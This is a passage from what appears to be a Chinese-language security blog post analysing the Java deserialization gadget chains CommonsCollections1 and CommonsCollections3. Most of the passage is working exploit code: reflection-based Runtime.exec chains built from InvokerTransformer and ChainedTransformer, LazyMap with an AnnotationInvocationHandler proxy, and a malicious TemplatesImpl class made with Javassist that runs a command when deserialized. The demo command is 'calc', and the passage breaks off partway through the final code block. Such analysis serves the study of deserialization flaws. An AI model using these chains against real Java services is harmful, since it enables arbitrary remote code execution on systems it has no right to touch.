<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(clazz);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">method1.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  除了使用Runtime之外，还可以利用ProcessBuilder来执行命令，具体实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(String[].class);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">method.invoke(object);</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CommonsCollection1链中，会调用到三个不同类的transformer方法，但最终利用到的是InvokerTransformer的transform方法，其方法具体实现如下：（这里删掉了部分异常语句）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">	<span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">	<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">	<span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  其中iMethodName、iParamTypes、iArgs变量是该类的成员变量。在反序列化漏洞中，我们可以理解为，这三个变量是我们可以进行控制的。上面这个transformer方法，我们可以理解其功能为调用传入的input对象的任意public方法或者其静态方法。</p>
<p>  接下来看看ChainedTransformer类的transformer方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 这里的关键就在于object变量，可以通过for循环来不断地更新。根据ysoserial上给出的Gadgets链，我们知道是LazyMap的get方法调用了这个transformer方法；我们继续向上追溯，在AnnotationInvocationHandler的invoke方法，通过调用this.memberValues.get(var4)方法，最终去触发LazyMap的get方法，而这里的var4变量为字符串。也就是说，我们最终传入transformer方法中的参数是不可控的。</p>
<p>   因此，这里又引入了另外一个类的transformer方法，即ConstantTransformer：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里的iConstant是成员变量，可控的。因此我们可以构造如下代码，当其调用ChainedTransformer的transformer方法后，不论传入的参数是任何值，都可以执行任意命令：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(runtime);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">	constantTransformer,<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  但是这里又有一个问题，Runtime类并没有实现Serializable接口，因此直接这样进行序列化和反序列化是不行的。解决这个问题就是采用反射的方式，来生成一个Runtime对象。（个人认为这也就是为什么反射在序列化过程中使用的比较多的一个原因吧，可能绝大多数的利用类都没有实现Serializable接口）</p>
<p>  接下来我们对上面这段代码进行修改，让其通过反射来生成一个Runtime对象，并最终达到命令执行的效果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">          constantTransformer,</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>  到这里，CC1链的核心部分就构造完成了，接下来要做的就是寻找调用链，让其最终可以调用到transform方法。</p>
<p>  前面说到过，LazyMap的get方法会调用到transform方法，我们继续向上追溯，可以发现在AnnotationInvocationHandler的invoke方法中调用了this.memberValues.get(var4)方法，这里就很容易想到动态代理了，在AnnotationInvocationHandler的readObject中，会调用到this.memberValues.entrySet方法，我们将这个this.memberValues设置成Map的代理对象，就可以构造整条链了，具体过程如下：</p>
<ul>
<li>先构造一个Map的代理对象</li>
<li>将其封装到AnnotationInvocationHandler的this.memberValues成员变量中</li>
<li>调用AnnotationInvocationHandler的readObject之后，会调用我们构造的代理类的invoke方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代理对象封装到AnnotationInvocationHandler中</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz1.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler1</span> <span class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,map);</span><br></pre></td></tr></table></figure>

<p>   到此，我们将invocationHandler1序列化之后，当反序列化这个数据流时，就会执行我们指定的任意命令。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/Untitled.png" alt="Untitled"></p>
<h2 id="二、CommonsCollection3链"><a href="#二、CommonsCollection3链" class="headerlink" title="二、CommonsCollection3链"></a>二、CommonsCollection3链</h2><p>  接下来看看CC3这条链，它是CC1链的一个改进版本，它使用了InstantiateTransformer类来替换InvokerTransformer。可以简单看看这个InstantiateTransformer.transform方法的具体实现：（其功能就是实例化一个对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(iArgs);</span><br></pre></td></tr></table></figure>

<p>  在CC3链中，会用到一个TemplateImpl类，这个类在Java反序列化中用的比较多，比如JDK7u21也会用到这个类，我们接下来简单分析一下该类的作用以及利用过程，这里直接给出利用链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">	-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">		-&gt; TemplatesImpl.getTransletInstance()</span><br><span class="line">			-&gt; TemplatesImpl.defineTransletClasses()</span><br><span class="line">				-&gt; loader.defineClass(_bytecodes[i]);</span><br></pre></td></tr></table></figure>

<p>  最终这条链利用的是defineClass来加载字节码从而达到任意命令执行的效果，在构建这个对象的时候，需要指定三个成员变量，分别为：_name、_bytecodes、_tfactory；其中_name和_tfactory的构造是为了最终能够执行到defineClass函数，而_bytecodes是真正的字节码部分。</p>
<p>  在TemplatesImpl.getTransletInstance方法中，需要指定_name为非空，从而跳过条件语句的执行，成功调用到TemplatesImpl.defineTransletClasses方法；在TemplatesImpl.defineTransletClasses方法中，需要设置_tfactory的值，让其调用getExternalExtensionsMap方法不出错就行。（有兴趣的话可以自己调试分析看看，这里就不说细节了）</p>
<p>  接下来我们要做的就是构造_bytecodes这个部分，这里也有一个限制，就是构造的恶意类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类（因为在调用defineClass后，程序会回到getTransletInstance方法中，在实例化之前，对传入的恶意类做了一个检测）；之后就是编写恶意类，并将其编译后的字节码信息传入这个变量了，这里有两种方式可以进行构造，一种是直接本地编译一个恶意类，然后读取字节码信息传入这个bytes数组；另一种方式是利用javassist来构造恶意类字节码。这里我用两种方式都尝试一下：</p>
<h3 id="1、编译成class文件，获取字节码信息"><a href="#1、编译成class文件，获取字节码信息" class="headerlink" title="1、编译成class文件，获取字节码信息"></a>1、编译成class文件，获取字节码信息</h3><p>  恶意类的编写如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  编译成class文件之后，获取字节码信息传给_bytecodes，调用newTransformer方法即可触发：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DataInputStream</span> <span class="variable">dataInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\Evil.class&quot;</span>)));</span><br><span class="line">        <span class="type">int</span> <span class="variable">available</span> <span class="operator">=</span> dataInputStream.available();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[available];</span><br><span class="line">        dataInputStream.read(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        object.newTransformer();</span><br></pre></td></tr></table></figure>

<h3 id="2、利用Javassist来构造字节码信息"><a href="#2、利用Javassist来构造字节码信息" class="headerlink" title="2、利用Javassist来构造字节码信息"></a>2、利用Javassist来构造字节码信息</h3><p>  上面是自定义了一个java文件，然后将其编译成class文件后，通过文件读取的方式获取字节码信息，从而传给_bytecodes成员变量；另外一种生成字节码的方式就是利用javassist，来动态生成相关字节码信息，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">object.newTransformer();</span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>  在CC3链中，前面的部分和CC1一样，都是通过动态代理的方式，最终调用LazyMap.get方法来执行ChainedTransformer.transform方法；前面有说过，InstantiateTransformer.transform方法就是实例化一个对象（调用某个类的构造方法），因此查找链的思路就是寻找一个类，在其调用构造方法时候，会调用到TemplatesImpl.newTransformer方法或者TemplatesImpl.getOutputProperties方法，因此这里利用到com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter这个类，可以看看这个类的构造方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">	_templates = templates;</span><br><span class="line">	_transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">	_transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">	_overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  这里调用了templates.newTransformer方法，我们只需要构造这个templates成员变量即可。所以，我们只需要修改ChainedTransformer中的内容即可；构造代码如下：（其中object为我们上面构造的TemplatesImpl实例对象）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br></pre></td></tr></table></figure>

<p>  当调用到chainedTransformer.transform方法后，就会执行恶意代码，最终完整的利用代码为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;public Evil() throws Exception&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>;</span><br><span class="line"><span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(code,ctClass);    <span class="comment">//创建构造函数</span></span><br><span class="line">ctClass.addConstructor(constructor);</span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));  <span class="comment">//设置父类</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line"><span class="type">Templates</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(object,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field1.set(object,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> object.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field2.set(object,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;object&#125;</span><br><span class="line">         )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"><span class="comment">// 创建一个动态代理对象</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor1.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(),invocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 